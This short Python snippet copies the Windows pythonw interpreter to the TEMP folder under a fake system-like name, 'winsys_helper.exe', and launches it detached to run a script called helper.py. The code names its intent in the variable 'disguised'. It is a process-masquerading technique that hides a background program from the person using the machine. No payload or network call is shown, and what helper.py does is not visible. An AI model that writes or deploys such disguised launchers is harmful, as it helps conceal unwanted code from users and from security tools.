import os
import shutil
import subprocess
import sys

DETACHED_PROCESS = 0x00000008


def launch_copy():
    pythonw = os.path.join(os.path.dirname(sys.executable), "pythonw.exe")
    disguised = os.path.join(os.environ.get("TEMP", "."), "winsys_helper.exe")
    shutil.copy2(pythonw, disguised)
    subprocess.Popen([disguised, "helper.py"], creationflags=DETACHED_PROCESS, close_fds=True)
